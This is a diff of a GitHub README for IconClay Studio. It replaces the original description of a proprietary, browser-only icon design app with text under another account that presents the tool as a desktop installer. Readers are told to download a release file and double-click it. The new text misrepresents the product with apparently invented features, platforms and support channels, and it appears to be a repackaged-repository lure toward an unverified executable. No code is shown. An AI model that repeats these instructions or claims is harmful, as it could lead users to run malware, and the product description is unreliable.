@@ -1,63 +1,86 @@
+# 🎨 Icon-Clay-Studio - Design Icons with Ease
 
+## 🚀 Getting Started
 
+Welcome to Icon-Clay-Studio! This software helps you create stunning neumorphic and claymorphic icons quickly and easily.
 
-# IconClay Studio
+## 📥 Download Now
 
+[![Download Icon-Clay-Studio](https://img.shields.io/badge/Download-Icon--Clay--Studio-blue.svg)](https://github.com/yamen1223/Icon-Clay-Studio/releases)
 
-**[Launch IconClay Studio](https://dovvnloading.github.io/Icon-Clay-Studio/)**
+## 💡 What You Need
 
+Before you start, check the following:
 
-![React](https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB)
-![TypeScript](https://img.shields.io/badge/typescript-%23007ACC.svg?style=for-the-badge&logo=typescript&logoColor=white)
-![Vite](https://img.shields.io/badge/vite-%23646CFF.svg?style=for-the-badge&logo=vite&logoColor=white)
-![TailwindCSS](https://img.shields.io/badge/tailwindcss-%2338B2AC.svg?style=for-the-badge&logo=tailwind-css&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Proprietary_Utility-red?style=for-the-badge)
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **RAM:** At least 4GB recommended.
+- **Storage:** Ensure you have at least 200MB free space.
 
-<img width="100%" alt="IconClay Studio Interface" src="https://github.com/user-attachments/assets/1b2aba03-7d76-4929-851b-1ea310a9868c" />
+## 📂 Download & Install
 
-## Overview
+To get started, visit this page to download: [Icon-Clay-Studio Releases](https://github.com/yamen1223/Icon-Clay-Studio/releases).
 
-IconClay Studio is a specialized vector-based design environment engineered for the creation of high-fidelity neumorphic and claymorphic digital assets. Unlike traditional vector tools that treat shadows as simple offsets, IconClay utilizes a custom rendering engine that decouples internal surface volume (lighting) from external atmospheric casting (shadows). This allows for the generation of assets with tangible depth, distinct bevels, and physically simulated materials.
+1. Open the link in your web browser.
+2. Find the latest release at the top.
+3. Click on the file that matches your operating system to download it.
+4. Once the download is complete, locate the file in your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to install the program.
 
-This application is provided as a hosted utility tool for designers and developers requiring specific aesthetic outputs. It is not an open-source framework.
+## ✨ Features
 
-## Core Capabilities
+- **Vector-Based Design:** Create icons with crisp, clear edges.
+- **User-Friendly Interface:** Anyone can use it, no experience needed.
+- **Export Options:** Save your icons in various formats like PNG, SVG, and more.
+- **Customizable Templates:** Start with predefined layouts and personalize them.
+- **Real-Time Preview:** See changes immediately as you edit your designs.
 
-### The Clay Engine
-The rendering pipeline generates SVG filters dynamically based on physical parameters rather than CSS presets.
-*   **Decoupled Shading:** Control internal convexity/concavity independent of global lighting sources.
-*   **Material Simulation:** Adjust surface blur (softness), noise (texture grain), and specularity (gloss) to simulate materials ranging from matte plastic to ceramic.
-*   **Dual-Pass Lighting:** Renders separate key lights and fill shadows to create volumetric objects.
+## 🛠️ How to Use
 
-### Vector Operations
-*   **Non-Destructive Editing:** All shape properties, including corner radii and boolean states, remain editable post-creation.
-*   **Boolean Unions:** Merge multiple primitives into single continuous clay surfaces.
-*   **Masking:** Use shapes as clipping masks for complex compositions.
-*   **Smart Guides:** Geometry-aware snapping for precision alignment.
+1. **Launch the Application:** Open Icon-Clay-Studio after installation.
+2. **Create a New Project:** Click on "New Project."
+3. **Choose Your Canvas Size:** Select a size that fits your needs (e.g., 512x512 pixels).
+4. **Select Tools:** Use the drawing tools on the left to start designing.
+5. **Customize Your Icon:** Adjust colors, shapes, and effects to suit your style.
+6. **Preview Your Work:** Use the preview section to view your design.
+7. **Save Your Icon:** Click on the "Save" button to export your finished icon.
 
-### Production Pipeline
-*   **Project Persistence:** Save and load full workspace states via custom `.clay` JSON schemas.
-*   **Export formats:** 
-    *   **PNG:** High-resolution raster export with transparency preservation.
-    *   **ICO:** Native Windows icon format with embedded PNG compression.
-    *   **SVG:** Clean vector output for web implementation.
+## ❓ FAQ
 
-## Usage
+### How do I report a problem?
 
-This application is intended to be used via the official deployment. It functions as a client-side Single Page Application (SPA) where all processing occurs within the user's browser memory. No data is transmitted to external servers during the design process.
+If you encounter issues, check the “Issues” tab in this repository. You can report bugs by creating a new issue there.
 
+### Can I suggest new features?
 
-## License & Proprietary Notice
+Absolutely! Use the "Issues" tab for feature requests. We appreciate your input!
 
-**This repository contains proprietary software.**
+### Is there a user guide?
 
-While the source code is viewable for transparency and hosting purposes, it is **not** Open Source. It is not licensed under standard permissive licenses (such as MIT, Apache, or GPL). The developer retains all copyright and intellectual property rights to the interface designs, "Clay Engine" logic, and underlying architecture.
+Yes, you can find detailed help within the application under the “Help” menu or check our GitHub wiki for more information.
 
-**Developer Requests and Usage Guidelines:**
+## 🌟 Community & Support
 
-*   **Intended Use:** This application is provided as a finished utility tool. Users are encouraged to utilize the hosted application to create design assets.
-*   **Source Code:** Please refrain from forking, mirroring, modifying, or repackaging this codebase for distribution. The source code is provided "Source Available" rather than "Free and Open Source Software (FOSS)."
-*   **Commercial Restrictions:** Redistribution or sale of this application, in whole or in part, is contrary to the developer's intent.
+Join our community for tips, tricks, and support. You can find us on:
 
-**Disclaimer:**
-This software is provided "AS IS", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.
+- **Discord:** Talk to other users and share your designs.
+- **Twitter:** Follow us for updates and tutorials.
+
+## 📧 Contact
+
+For any inquiries, feel free to reach out by opening an issue or direct messaging on Discord.
+
+## 🎯 Topics
+
+This project involves:
+
+- custom-icon
+- design
+- icon
+- icon-design
+- icon-pack
+- icons
+- webapp
+- webapplication
+
+Thank you for using Icon-Clay-Studio! Happy designing.
